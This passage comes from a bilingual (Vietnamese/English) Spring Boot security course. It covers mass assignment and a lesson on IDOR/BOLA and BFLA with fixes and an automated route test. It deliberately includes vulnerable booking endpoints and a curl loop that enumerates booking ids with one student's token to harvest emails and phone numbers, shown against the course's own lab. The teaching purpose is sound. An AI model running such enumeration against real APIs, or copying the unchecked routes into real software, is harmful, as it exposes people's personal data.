  <li>Để ý cả chiều trả về: trả entity là lộ mọi cột thêm sau này (ví dụ một <code>reset_token</code> năm sau).</li>
</ul>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Mass assignment là gì, chặn trong Spring thế nào?"</strong> — Gán dữ liệu client vào đối tượng có nhiều thuộc tính hơn client được đặt. Dùng DTO request (record) chỉ có trường được phép, ánh xạ tường minh; không bao giờ dùng entity làm <code>@RequestBody</code>.</li>
  <li><strong>"Sao không đặt @JsonIgnore lên trường role cho nhanh?"</strong> — Đó là danh sách cấm trên một lớp dùng chung; mọi trường nhạy cảm mới đều phải nhớ nó, và nó còn giấu trường ở phản hồi nơi có thể bạn cần. DTO là danh sách cho phép theo từng ca sử dụng.</li>
  <li><strong>"Người dùng đã đổi vai trò mà chưa có tác dụng cho tới khi đăng nhập lại. Vì sao?"</strong> — JWT giữ vai trò từ lúc đăng nhập; phân quyền đọc token, không đọc CSDL. Đó cũng là lý do đổi vai trò và thu hồi cần access token ngắn (bài 9.5).</li>
  <li><strong>"Spring4Shell là gì?"</strong> — CVE-2022-22965: gán dữ liệu vào đường <code>class.module.classLoader</code> trên JDK 9+ dẫn tới thực thi mã từ xa khi chạy WAR trên Tomcat; vá ở Spring 5.3.18/5.2.20.</li>
  <li><strong>"OWASP API3?"</strong> — Broken Object Property Level Authorization: người dùng được truy cập đối tượng nhưng không phải mọi thuộc tính — gồm cả ghi (mass assignment) lẫn đọc (lộ dữ liệu thừa).</li>
</ol>

<h3>🧪 Thực hành (20 phút)</h3>
<div class="callout ok"><ol>
  <li>Trước khi chạy, đoán mã trạng thái và <code>role</code> trong CSDL cho ba thân sau gửi tới <code>PATCH /v0/me</code>: <code>{"displayName":"A"}</code>, <code>{"displayName":"A","role":"ADMIN"}</code>, <code>{"id":1}</code>.</li>
  <li>Đoán tiếp ba thân đó với <code>PATCH /me</code> đã vá, lần đầu với mặc định của Spring Boot, lần sau với <code>fail-on-unknown-properties=true</code>.</li>
  <li>Liệt kê mọi trường trong phản hồi của <code>PATCH /v0/me</code> mà sinh viên không nên thấy, kèm lý do.</li>
</ol>
<p><strong>Đạt khi:</strong> chín dự đoán khớp output trong bài, và danh sách có ít nhất <code>passwordHash</code>, <code>id</code>, <code>studentId</code>, mỗi trường một lý do.</p></div>
${giai('Xem đáp án', `<p><code>/v0/me</code>: 200 / STUDENT; 200 / ADMIN; 500 (Hibernate "Identifier … was altered from 2 to 1") / không đổi. <code>/me</code> mặc định: cả ba 200 / STUDENT (trường lạ bị bỏ qua; <code>{"id":1}</code> không đổi gì). Chế độ chặt: thân đầu 200, hai thân có <code>role</code> hoặc <code>id</code> nhận 400. Các trường: <code>passwordHash</code> (nguyên liệu bẻ ngoại tuyến), <code>id</code> và <code>studentId</code> (khoá nội bộ giúp đoán IDOR dễ hơn, bài 10.2); <code>role</code> đọc thì vô hại nhưng chứng tỏ entity đang bị phơi ra.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Mass assignment</span><span class="v">Gán mọi thuộc tính client gửi vào đối tượng, kể cả thuộc tính client không được đặt.</span></div>
  <div class="kv"><span class="k">BOPLA (API3:2023)</span><span class="v">Phân quyền cấp thuộc tính bị hỏng: được truy cập đối tượng nhưng không phải mọi thuộc tính của nó.</span></div>
  <div class="kv"><span class="k">Lộ dữ liệu thừa</span><span class="v">Trả về nhiều thuộc tính hơn client cần (entity thay vì view).</span></div>
  <div class="kv"><span class="k">DTO</span><span class="v">Data Transfer Object: kiểu request/response thiết kế cho một ca sử dụng; trong Java 21 thường là record.</span></div>
  <div class="kv"><span class="k">Danh sách cho phép / cấm</span><span class="v">Liệt kê điều được phép (an toàn mặc định) vs liệt kê điều bị cấm (không an toàn mặc định).</span></div>
  <div class="kv"><span class="k">DataBinder</span><span class="v">Thành phần Spring MVC gán tham số request vào thuộc tính đối tượng theo tên.</span></div>
  <div class="kv"><span class="k">Spring4Shell</span><span class="v">CVE-2022-22965, thực thi mã từ xa qua gán dữ liệu vào đường <code>class.*</code>.</span></div>
  <div class="kv"><span class="k">Prototype pollution</span><span class="v">Chỉ JavaScript: khoá <code>__proto__</code> đổi prototype của đối tượng.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
  <li><code>readerForUpdating</code> vào entity + một trường thừa = ADMIN sau lần đăng nhập kế (đo thật).</li>
  <li>Trả entity làm lộ băm BCrypt ngay ở một request bình thường.</li>
  <li><code>@ModelAttribute</code> trên entity cùng lỗi; Spring chỉ chặn <code>class.*</code> từ sau Spring4Shell, không chặn gì khác.</li>
  <li>Vá: record request (danh sách cho phép) + record response + validation; tuỳ chọn chế độ chặt để trả 400 với trường lạ.</li>
  <li>Express cùng lỗi (<code>Object.assign</code>) cộng prototype pollution; zod <code>.strict()</code> là cách vá tương đương.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/', '🛡️', 'OWASP API3:2023 Broken Object Property Level Authorization', 'Mass assignment và lộ dữ liệu thừa, kèm ví dụ.')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html', '📋', 'OWASP Mass Assignment Cheat Sheet', 'Cách phòng theo từng framework, có Spring MVC.')}
${tl('https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement', '🍃', 'Spring Framework RCE, Early Announcement (2022)', 'Bài chính thức về Spring4Shell và các bản đã vá.')}
${tl('https://github.blog/2012-03-04-public-key-security-vulnerability-and-mitigation/', '🐙', 'GitHub — Public key security vulnerability and mitigation (2012)', 'GitHub tự kể vụ Homakov.')}

<h3>Nguồn</h3>
<ul>
  <li>Output trong bài: <code>labflow.DemoApp</code> (<code>HoSoV0</code>, <code>HoSoController</code>) ở <code>lab/c10/app</code>, Spring Boot 4.1.2, Jackson 3.1.7, Hibernate 7.4.13.Final, PostgreSQL 16.15; Node 22 (20/11/2026).</li>
  <li>Blog GitHub, 4/3/2012; blog Spring và CVE-2022-22965, 31/3/2022.</li>
</ul>
</div>
`;

// ===== Bài 10.2 =====
const MA102_V0 = java("/** IDOR: chỉ cần đăng nhập, id nào cũng xem được — kèm email và số điện thoại của chủ lượt đặt. */\n@GetMapping(\"/bookings/{id}\")\nBookingFull xem(@PathVariable long id) {\n    return db.sql(FULL + \"where b.id = ?\").param(id).query(BookingFull.class).optional()\n        .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));\n}\n\n/** BFLA: duyệt là việc của ADMIN, nhưng tuyến này chỉ kiểm \"đã đăng nhập\". */\n@PatchMapping(\"/bookings/{id}/approve\")\n@Transactional\nBookingFull duyet(@PathVariable long id) {\n    db.sql(\"update bookings set status = 'APPROVED', version = version + 1 where id = ?\").param(id).update();\n    return xem(id);\n}");
const OUT102 = out("# Lan sở hữu lượt đặt id: 25 · lượt đầu của An: 18\n# 1. Lan xem lượt của chính mình, rồi đổi id thành lượt của An\n$ curl -X GET /v0/bookings/25 -H \"Authorization: Bearer $LAN\"\n{\"id\":25,\"labCode\":\"NET-02\",\"studentCode\":\"SE180123\",\"email\":\"lan@fpt.edu.vn\",\"phone\":\"0901234567\",\"startAt\":\"2030-03-03T08:00:00\",\"endAt\":\"2030-03-03T09:00:00\",\"status\":\"PENDING\"}\nHTTP 200\n$ curl -X GET /v0/bookings/18 -H \"Authorization: Bearer $LAN\"\n{\"id\":18,\"labCode\":\"IOT-01\",\"studentCode\":\"SE180124\",\"email\":\"an@fpt.edu.vn\",\"phone\":\"0912345678\",\"startAt\":\"2030-03-03T01:00:00\",\"endAt\":\"2030-03-03T02:00:00\",\"status\":\"PENDING\"}\nHTTP 200\n\n# 2. Vòng lặp 1..40 bằng token của Lan\n$ for i in $(seq 1 40); do curl -s -o /tmp/b$i.json -w \"%{http_code}\\n\" -H \"Authorization: Bearer $LAN\" localhost:8080/v0/bookings/$i; done | sort | uniq -c\n     30 200\n     10 404\n# thời gian: 454 ms\n$ cat /tmp/b*.json | jq -r .studentCode | sort -u | wc -l ; cat /tmp/b*.json | jq -r \"select(.phone) | .email + \\\"  \\\" + .phone\"\n25\nan@fpt.edu.vn  0912345678\nbinh@fpt.edu.vn  0923456789\nchi@fpt.edu.vn  0934567890\nlan@fpt.edu.vn  0901234567\n\n# 3. BFLA: duyệt là việc của ADMIN, tuyến v0 chỉ kiểm đã đăng nhập\n$ curl -X PATCH /v0/bookings/18/approve -H \"Authorization: Bearer $LAN\"\n{\"id\":18,\"labCode\":\"IOT-01\",\"studentCode\":\"SE180124\",\"email\":\"an@fpt.edu.vn\",\"phone\":\"0912345678\",\"startAt\":\"2030-03-03T01:00:00\",\"endAt\":\"2030-03-03T02:00:00\",\"status\":\"APPROVED\"}\nHTTP 200");
const MA102_QUYEN = java("@Component(\"quyen\")\nclass Quyen {\n    private final JdbcClient db;\n    Quyen(JdbcClient db) { this.db = db; }\n\n    static boolean laAdmin(Authentication a) { return a.getAuthorities().stream().anyMatch(g -> g.getAuthority().equals(\"ROLE_ADMIN\")); }\n\n    public boolean chuHoacAdmin(long bookingId, Authentication a) {\n        if (laAdmin(a)) return true;\n        return db.sql(\"select s.student_code from bookings b join students s on s.id = b.student_id where b.id = ?\")\n            .param(bookingId).query(String.class).optional().map(a.getName()::equals).orElse(false);\n    }\n\n    public boolean chinhMinhHoacAdmin(String studentCode, Authentication a) { return laAdmin(a) || a.getName().equals(studentCode); }\n}");
const OUT102_DUNG1 = out("# 4. Bản đúng 1 — @PreAuthorize(\"@quyen.chuHoacAdmin(#id, authentication)\")\n$ curl -X GET /bookings/18 -H \"Authorization: Bearer $LAN\"\n\nHTTP 403\n$ curl -X GET /bookings/999 -H \"Authorization: Bearer $LAN\"\n\nHTTP 403\n$ curl -X GET /bookings/18 -H \"Authorization: Bearer $AN\"\n{\"id\":18,\"labCode\":\"IOT-01\",\"studentCode\":\"SE180124\",\"startAt\":\"2030-03-03T01:00:00\",\"endAt\":\"2030-03-03T02:00:00\",\"status\":\"APPROVED\",\"version\":1}\nHTTP 200\n$ curl -X PATCH /bookings/18/approve -H \"Authorization: Bearer $LAN\" -d '{\"version\":1}'\n\nHTTP 403");
const MA102_V2 = java("@GetMapping(\"/v2/bookings/{id}\")\nV0Booking.BookingFull xem(@PathVariable long id, Authentication a) {\n    return db.sql(V0Booking.FULL + \"where b.id = :id and (s.student_code = :me or :admin)\")\n        .param(\"id\", id).param(\"me\", a.getName()).param(\"admin\", Quyen.laAdmin(a))\n        .query(V0Booking.BookingFull.class).optional()\n        .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND));\n}");
const OUT102_DUNG2 = out("# 5. Bản đúng 2 — chủ sở hữu nằm trong câu truy vấn (/v2)\n$ curl -X GET /v2/bookings/18 -H \"Authorization: Bearer $LAN\"\n{\"instance\":\"/v2/bookings/18\",\"status\":404,\"title\":\"Not Found\"}\nHTTP 404\n$ curl -X GET /v2/bookings/999 -H \"Authorization: Bearer $LAN\"\n{\"instance\":\"/v2/bookings/999\",\"status\":404,\"title\":\"Not Found\"}\nHTTP 404\n$ curl -X GET /v2/bookings/18 -H \"Authorization: Bearer $AN\"\n{\"id\":18,\"labCode\":\"IOT-01\",\"studentCode\":\"SE180124\",\"email\":\"an@fpt.edu.vn\",\"phone\":\"0912345678\",\"startAt\":\"2030-03-03T01:00:00\",\"endAt\":\"2030-03-03T02:00:00\",\"status\":\"APPROVED\"}\nHTTP 200");
const MA102_TEST = java("/** 10.2 — test chặn IDOR: Lan (SE180123) KHÔNG được đọc lượt đặt của An (SE180124) qua BẤT KỲ tuyến GET nào có {id}. */\n@SpringBootTest(properties = { \"labflow.jwt.secret=test-chi-dung-trong-test-dai-hon-32-byte-000\", \"labflow.admin.password=\" })\n@AutoConfigureMockMvc\n@ActiveProfiles(\"dev\")\nclass IdorTest {\n    @Autowired MockMvc mvc;\n    @Autowired JdbcClient db;\n    @Autowired @Qualifier(\"requestMappingHandlerMapping\") RequestMappingHandlerMapping hm;\n\n    static RequestPostProcessor sv(String code) {\n        return jwt().jwt(j -> j.subject(code)).authorities(new SimpleGrantedAuthority(\"ROLE_STUDENT\"));\n    }\n\n    long luotDauCua(String code) {\n        return db.sql(\"select b.id from bookings b join students s on s.id = b.student_id where s.student_code = ? order by b.id limit 1\")\n            .param(code).query(Long.class).single();\n    }\n\n    @Test\n    void lanKhongXemDuocLuotDatCuaAn() throws Exception {\n        long cuaAn = luotDauCua(\"SE180124\");\n        mvc.perform(get(\"/bookings/{id}\", cuaAn).with(sv(\"SE180123\"))).andExpect(status().isForbidden());\n        mvc.perform(get(\"/bookings/{id}\", cuaAn).with(sv(\"SE180124\"))).andExpect(status().isOk());\n    }\n\n    /** Không liệt kê tay: hỏi chính Spring MVC xem ứng dụng có những tuyến GET nào chứa {id}. Tuyến mới thêm sau này cũng bị kiểm. */\n    @TestFactory\n    Stream<DynamicTest> moiTuyenGetCoId() {\n        long cuaAn = luotDauCua(\"SE180124\");\n        return hm.getHandlerMethods().keySet().stream()\n            .filter(i -> i.getMethodsCondition().getMethods().contains(RequestMethod.GET))\n            .flatMap(i -> i.getPatternValues().stream()).filter(p -> p.contains(\"{id}\")).sorted()\n            .map(p -> DynamicTest.dynamicTest(\"GET \" + p, () -> {\n                int s = mvc.perform(get(p, cuaAn).with(sv(\"SE180123\"))).andReturn().getResponse().getStatus();\n                assertTrue(s == 403 || s == 404, \"Lan đọc được lượt đặt \" + cuaAn + \" của An qua \" + p + \" (HTTP \" + s + \")\");\n            }));\n    }\n}");
const OUT102_TEST = out("$ ./mvnw test -Dtest=IdorTest\n[INFO] Running labflow.IdorTest\n[ERROR] Tests run: 4, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 6.201 s <<< FAILURE! -- in labflow.IdorTest\n[ERROR] labflow.IdorTest.moiTuyenGetCoId()[2] -- Time elapsed: 0.024 s <<< FAILURE!\norg.opentest4j.AssertionFailedError: Lan đọc được lượt đặt 18 của An qua /v0/bookings/{id} (HTTP 200) ==> expected: <true> but was: <false>\n[ERROR] Tests run: 4, Failures: 1, Errors: 0, Skipped: 0\n[INFO] BUILD FAILURE");

const L102_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 10 · Lesson 10.2</span>
<h2>IDOR and broken object-level authorization</h2>
<p class="lead">Lesson 9.6 added an ownership check to LabFlow. This lesson removes it, attacks the result the way a scraper would — a loop over ids — and counts what leaks in under half a second. Then we put the check back in two different ways, compare them, and write a test that discovers new unprotected routes by itself, so the bug cannot quietly come back.</p>

<h3>In everyday life first</h3>
<p>A gym gives you locker 18 and a key with "18" on it. The lock on every locker is the same model and the attendant checks only that you are a member. If you try locker 19 with a paper clip, nothing stops you. Being a member (authentication) is not the same as owning locker 19 (authorization on the <em>object</em>). That gap is <strong>IDOR</strong> — Insecure Direct Object Reference — called <strong>BOLA</strong> (Broken Object Level Authorization) by OWASP, and number one on the API Top 10 since 2019.</p>
<p>Its sibling is <strong>BFLA</strong>, Broken Function Level Authorization (API5:2023): the object may be fine, but the <em>function</em> is not yours — a student calling the "approve" endpoint meant for the lab manager.</p>

<h3>The vulnerable code</h3>
${MA102_V0}
<p>Both routes are behind <code>anyRequest().authenticated()</code>, so an anonymous request still gets 401 and a quick test "without a token ⇒ 401" passes. The routes simply never ask <em>whose</em> booking this is.</p>

<h3>Experiment: one student, every booking</h3>
${OUT102}
<ul>
  <li>Changing <code>25</code> to <code>18</code> returned An's booking, with her e-mail and phone number. Nothing in the request was clever.</li>
  <li>A loop over ids 1–40 took <strong>454 ms</strong>: 30 bookings of <strong>25 different students</strong>, and every phone number the table holds. Real attackers run this with thousands of parallel requests.</li>
  <li>The 10 answers of 404 are information too: they tell the attacker exactly which ids exist (here 1–30). Sequential ids make the whole table enumerable.</li>
  <li>Step 3 is BFLA: a student approved An's booking. The function is the lab manager's, and only "logged in" was checked.</li>
</ul>

<h3>Fix 1: a declarative check on the method</h3>
<p>The ownership bean from lesson 9.6, used by <code>@PreAuthorize("@quyen.chuHoacAdmin(#id, authentication)")</code> on view and cancel, and <code>@PreAuthorize("hasRole('ADMIN')")</code> on approve:</p>
${MA102_QUYEN}
${OUT102_DUNG1}
<ul>
  <li>Lan gets 403 for An's booking <em>and</em> for id 999, which does not exist. Same answer for "not yours" and "not there" — the id space can no longer be probed.</li>
  <li>An gets her own booking (200). Lan's approve attempt is refused (403): BFLA closed by a role rule.</li>
  <li>Cost: one extra small query per request, and the rule lives on the controller — every new object endpoint must remember it.</li>
</ul>

<h3>Fix 2: the owner inside the query</h3>
${MA102_V2}
${OUT102_DUNG2}
<ul>
  <li>The query cannot return someone else's row, so there is nothing to forget in the service: "not yours" is literally "not found" (404, the same for id 999).</li>
  <li>This style also protects lists and searches (<code>where s.student_code = :me</code>), where <code>@PreAuthorize</code> on an id does not help.</li>
  <li>Which status? 403 says "exists, not for you"; 404 says nothing. GitHub answers 404 for private repositories you cannot see. Either is fine if it is the same for both cases.</li>
</ul>

<h3>"Just use UUIDs"</h3>
<p>Random ids (UUID v4) make a blind loop over ids useless, and that is worth having. But ids leak: in URLs people share, in browser history, in logs, in other API responses (lesson 10.1 returned <code>studentId</code>). Once an attacker holds one valid id, only the authorization check stands. Unguessable ids are a second layer, never the check itself.</p>

<h3>A test that finds the next unprotected route</h3>
<p>Lists of routes written by hand go stale. This test asks Spring MVC for every GET route with <code>{id}</code>, then calls each one as Lan with An's booking id, using <code>jwt()</code> from <code>spring-security-test</code> (no real login needed):</p>
${MA102_TEST}
${OUT102_TEST}
<ul>
  <li>Three routes were found (sorted): <code>/bookings/{id}</code>, <code>/v0/bookings/{id}</code>, <code>/v2/bookings/{id}</code>. The second one failed, with a message that names the route and the leaked booking.</li>
  <li>When a teammate adds <code>GET /bookings/{id}/invoice</code> next month without a check, this test turns red on their pull request — nobody has to remember to add a test.</li>
  <li>It runs against the real PostgreSQL schema (Flyway migrations, dev seed). Chapter 11 moves it to Testcontainers.</li>
</ul>

<h3>🕵️ Hacker corner — Optus 2022</h3>
<p>In September 2022 the Australian telco Optus disclosed that data of about 9.8 million current and former customers had been taken: names, dates of birth, phone numbers, addresses, and for millions of them passport or driver's licence numbers. The attacker found an internet-facing API endpoint that returned customer records without proper access control, and walked through customer ids one by one — exactly the loop above, with a much larger table. The Australian regulator later attributed it to an access-control coding error that had been fixed on the main domain but not on that endpoint.</p>
<p><strong>What you do:</strong> an ownership or role check on every object endpoint (method annotation or owner-scoped query); the same response for "not yours" and "not found"; random public ids as an extra layer; an automated test over all routes with ids; rate limits and alerts on many 403/404 from one user (lesson 10.5).</p>

<h3>Compared with Node.js</h3>
<p>Express has no method security, so the check is a middleware or a line in the handler: load the booking, compare <code>booking.studentCode</code> with <code>req.user.sub</code>, answer 403 — on every route, by hand. The owner-scoped query is the same idea in Prisma: <code>findFirst({ where: { id, student: { code: req.user.sub } } })</code> returns <code>null</code> for other people's rows. The route-discovery test is harder in Express (routes live in a router stack), which is one reason Spring teams write it more often.</p>

<h3>In real life and at work</h3>
<ul>
  <li>Typical SWP391 bug: <code>GET /api/orders/{id}</code> checks only that the user is logged in, because the frontend "only shows your own orders". The frontend is not a security boundary.</li>
  <li>Bug bounty programmes pay more for IDOR than for almost anything else in APIs, because it is common and the impact is real data.</li>
  <li>In code review, for each new route ask three questions: who may call it, which object does it touch, where is the line that ties the object to the caller.</li>
</ul>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"What is IDOR / BOLA?"</strong> — Accessing an object by its identifier without checking that it belongs to (or is allowed for) the caller. Authenticated ≠ authorized for this object.</li>
  <li><strong>"BOLA vs BFLA?"</strong> — BOLA: wrong object (Lan reads An's booking). BFLA: wrong function (a student calls the admin's approve).</li>
  <li><strong>"Where do you put the ownership check in Spring?"</strong> — <code>@PreAuthorize</code> with a bean, or an owner-scoped repository query; never only in the frontend; for lists always a scoped query.</li>
  <li><strong>"403 or 404 for someone else's resource?"</strong> — Either, consistently; 404 hides existence; never 404 for one and 403 for the other.</li>
  <li><strong>"Do UUIDs fix IDOR?"</strong> — No; they slow enumeration, but leaked ids are still usable without a check.</li>
</ol>

<h3>🧪 Practice (25 minutes)</h3>
<div class="callout ok"><ol>
  <li>Predict the status Lan gets for: <code>GET /v0/bookings/18</code>, <code>GET /bookings/18</code>, <code>GET /bookings/999</code>, <code>GET /v2/bookings/18</code>, <code>GET /v2/bookings/999</code>, <code>PATCH /v0/bookings/18/approve</code>, <code>PATCH /bookings/18/approve</code>.</li>
  <li>From the loop output, explain how an attacker knows the table holds exactly 30 bookings.</li>
  <li>The test found three GET routes with <code>{id}</code>. Name them in sorted order and say which one failed and why.</li>
</ol>
<p><strong>Done when:</strong> all seven predictions match the outputs, your answer to 2 mentions the 404 for ids 31–40, and your answer to 3 names <code>/v0/bookings/{id}</code> as index [2].</p></div>
${giai('Show the answers', `<p>200, 403, 403, 404, 404, 200, 403 (outputs of experiment steps 1, 3, 4 and 5). Ids 1–30 answered 200 and 31–40 answered 404, so the existing range is visible. Sorted routes: [1] <code>/bookings/{id}</code> (403, passes), [2] <code>/v0/bookings/{id}</code> (200, fails — no ownership check), [3] <code>/v2/bookings/{id}</code> (404, passes).</p>`)}

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">IDOR</span><span class="v">Insecure Direct Object Reference: object reachable by id without an authorization check.</span></div>
  <div class="kv"><span class="k">BOLA (API1:2023)</span><span class="v">Broken Object Level Authorization — OWASP's API name for IDOR.</span></div>
  <div class="kv"><span class="k">BFLA (API5:2023)</span><span class="v">Broken Function Level Authorization: calling a function reserved for another role.</span></div>
  <div class="kv"><span class="k">Enumeration</span><span class="v">Walking through ids (1, 2, 3…) to discover and collect objects.</span></div>
  <div class="kv"><span class="k">Owner-scoped query</span><span class="v">A query that includes the caller in its WHERE clause, so other people's rows cannot be returned.</span></div>
  <div class="kv"><span class="k">jwt() post-processor</span><span class="v"><code>spring-security-test</code> helper that puts a fake authenticated JWT on a MockMvc request.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
  <li>Logged in is not authorized: one loop read 30 bookings of 25 students, with phones, in 454 ms.</li>
  <li>404 vs 200 on ids reveals the table size; answer "not yours" and "missing" the same.</li>
  <li>Fix with <code>@PreAuthorize</code> + ownership bean, or an owner-scoped query (also works for lists).</li>
  <li>BFLA: role rules on functions like approve.</li>
  <li>Let a test enumerate the routes; it caught <code>/v0/bookings/{id}</code> without a hand-written list.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/', '🛡️', 'OWASP API1:2023 Broken Object Level Authorization', 'Attack scenarios and prevention.')}
${tl('https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/', '🛡️', 'OWASP API5:2023 Broken Function Level Authorization', 'When the function, not the object, is the problem.')}
${tl('https://docs.spring.io/spring-security/reference/servlet/test/mockmvc/oauth2.html', '🍃', 'Spring Security — Testing OAuth 2.0 with MockMvc', 'jwt(), authorities and claims in tests.')}
${tl('https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html', '📋', 'OWASP IDOR Prevention Cheat Sheet', 'Checks, indirect references and testing.')}

<h3>Sources</h3>
<ul>
  <li>Outputs above: <code>labflow.DemoApp</code> (<code>V0Booking</code>, <code>Quyen</code>, <code>XemTheoChu</code>, <code>IdorTest</code>) in <code>lab/c10/app</code>, Spring Boot 4.1.2, Spring Security 7.1.2, PostgreSQL 16.15 (20/11/2026).</li>
  <li>Optus disclosure, 22/9/2022; reporting by the ABC and the Australian Communications and Media Authority.</li>
</ul>
</div>
`;

const L102_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 10 · Bài 10.2</span>
<h2>IDOR và phân quyền cấp đối tượng</h2>
<p class="lead">Bài 9.6 đã thêm kiểm chủ sở hữu cho LabFlow. Bài này gỡ nó ra, tấn công kết quả đúng như một công cụ cào dữ liệu — một vòng lặp qua các id — và đếm thứ bị lộ trong chưa tới nửa giây. Rồi ta lắp lại phép kiểm theo hai cách khác nhau, so sánh chúng, và viết một test TỰ tìm tuyến mới chưa được bảo vệ, để lỗi không lặng lẽ quay lại.</p>

<h3>Đời thường trước đã</h3>
<p>Phòng tập đưa bạn tủ đồ số 18 và chìa khoá khắc "18". Ổ khoá mọi tủ cùng một loại, nhân viên chỉ kiểm bạn có phải hội viên không. Nếu bạn thử tủ 19 bằng một cái kẹp giấy, không gì cản bạn. Là hội viên (xác thực) không có nghĩa là sở hữu tủ 19 (phân quyền trên <em>đối tượng</em>). Khoảng hở đó là <strong>IDOR</strong> — Insecure Direct Object Reference — OWASP gọi là <strong>BOLA</strong> (Broken Object Level Authorization), đứng số một trong API Top 10 từ năm 2019.</p>
<p>Người anh em của nó là <strong>BFLA</strong>, Broken Function Level Authorization (API5:2023): đối tượng có thể không sao, nhưng <em>chức năng</em> không phải của bạn — sinh viên gọi tuyến "duyệt" vốn dành cho quản lý phòng lab.</p>

<h3>Mã có lỗ</h3>
${MA102_V0}
<p>Cả hai tuyến nằm sau <code>anyRequest().authenticated()</code>, nên request ẩn danh vẫn nhận 401 và một test vội "không token ⇒ 401" vẫn xanh. Hai tuyến chỉ đơn giản là không bao giờ hỏi lượt đặt này <em>của ai</em>.</p>

<h3>Thí nghiệm: một sinh viên, mọi lượt đặt</h3>
${OUT102}
<ul>
  <li>Đổi <code>25</code> thành <code>18</code> là ra lượt đặt của An, kèm email và số điện thoại. Request không có gì khôn ngoan.</li>
  <li>Vòng lặp id 1–40 mất <strong>454 ms</strong>: 30 lượt đặt của <strong>25 sinh viên khác nhau</strong>, và mọi số điện thoại bảng đang giữ. Kẻ tấn công thật chạy vòng này với hàng nghìn request song song.</li>
  <li>10 câu trả lời 404 cũng là thông tin: chúng cho kẻ tấn công biết chính xác id nào tồn tại (ở đây 1–30). Id tăng dần khiến cả bảng bị liệt kê được.</li>
  <li>Bước 3 là BFLA: một sinh viên duyệt lượt đặt của An. Chức năng là của quản lý lab, và chỉ "đã đăng nhập" được kiểm.</li>
</ul>

<h3>Vá 1: phép kiểm khai báo trên phương thức</h3>
<p>Bean kiểm chủ từ bài 9.6, dùng bằng <code>@PreAuthorize("@quyen.chuHoacAdmin(#id, authentication)")</code> trên xem và huỷ, và <code>@PreAuthorize("hasRole('ADMIN')")</code> trên duyệt:</p>
${MA102_QUYEN}
${OUT102_DUNG1}
<ul>
  <li>Lan nhận 403 cho lượt của An <em>và</em> cho id 999 vốn không tồn tại. Cùng một câu trả lời cho "không phải của bạn" và "không có" — không gian id không còn dò được.</li>
  <li>An xem được lượt của mình (200). Lan thử duyệt bị từ chối (403): BFLA đóng bằng luật vai trò.</li>
  <li>Cái giá: thêm một truy vấn nhỏ mỗi request, và luật nằm trên controller — mọi tuyến đối tượng mới đều phải nhớ nó.</li>
</ul>

<h3>Vá 2: chủ sở hữu nằm ngay trong truy vấn</h3>
${MA102_V2}
${OUT102_DUNG2}
<ul>
  <li>Truy vấn không thể trả về dòng của người khác, nên không có gì để quên ở service: "không phải của bạn" đúng nghĩa đen là "không tìm thấy" (404, giống hệt id 999).</li>
  <li>Kiểu này còn bảo vệ được danh sách và tìm kiếm (<code>where s.student_code = :me</code>), chỗ mà <code>@PreAuthorize</code> theo id không giúp được.</li>
  <li>Mã trạng thái nào? 403 nói "có tồn tại, không dành cho bạn"; 404 không nói gì. GitHub trả 404 cho kho riêng tư bạn không được xem. Chọn cái nào cũng được, miễn hai trường hợp giống nhau.</li>
</ul>

<h3>"Cứ dùng UUID là xong"</h3>
<p>Id ngẫu nhiên (UUID v4) làm vòng lặp mù qua id vô dụng, và điều đó đáng có. Nhưng id vẫn lộ: trong đường dẫn người ta chia sẻ, lịch sử trình duyệt, log, phản hồi của API khác (bài 10.1 đã trả <code>studentId</code>). Khi kẻ tấn công cầm được một id hợp lệ, chỉ còn phép kiểm phân quyền đứng chắn. Id khó đoán là lớp thứ hai, không bao giờ là phép kiểm.</p>

<h3>Một test tìm ra tuyến chưa được bảo vệ tiếp theo</h3>
<p>Danh sách tuyến viết tay sẽ cũ đi. Test này hỏi Spring MVC mọi tuyến GET có <code>{id}</code>, rồi gọi từng tuyến dưới vai Lan với id lượt đặt của An, dùng <code>jwt()</code> của <code>spring-security-test</code> (không cần đăng nhập thật):</p>
${MA102_TEST}
${OUT102_TEST}
<ul>
  <li>Tìm thấy ba tuyến (đã sắp xếp): <code>/bookings/{id}</code>, <code>/v0/bookings/{id}</code>, <code>/v2/bookings/{id}</code>. Tuyến thứ hai trượt, với thông báo nêu đúng tuyến và lượt đặt bị lộ.</li>
  <li>Tháng sau đồng đội thêm <code>GET /bookings/{id}/invoice</code> mà quên kiểm, test này đỏ ngay trên pull request của họ — không ai phải nhớ viết thêm test.</li>
  <li>Nó chạy với schema PostgreSQL thật (migration Flyway, dữ liệu dev). Chương 11 chuyển nó sang Testcontainers.</li>
</ul>

<h3>🕵️ Góc hacker — Optus 2022</h3>
<p>Tháng 9/2022 nhà mạng Úc Optus công bố dữ liệu của khoảng 9,8 triệu khách hàng hiện tại và cũ đã bị lấy: họ tên, ngày sinh, số điện thoại, địa chỉ, và với hàng triệu người là số hộ chiếu hoặc bằng lái. Kẻ tấn công tìm được một tuyến API mở ra Internet trả về hồ sơ khách hàng mà không kiểm soát truy cập đúng, rồi đi qua từng id khách hàng — đúng vòng lặp ở trên, với một bảng lớn hơn rất nhiều. Cơ quan quản lý của Úc sau đó quy cho một lỗi viết mã kiểm soát truy cập đã được vá ở tên miền chính nhưng không ở tuyến đó.</p>
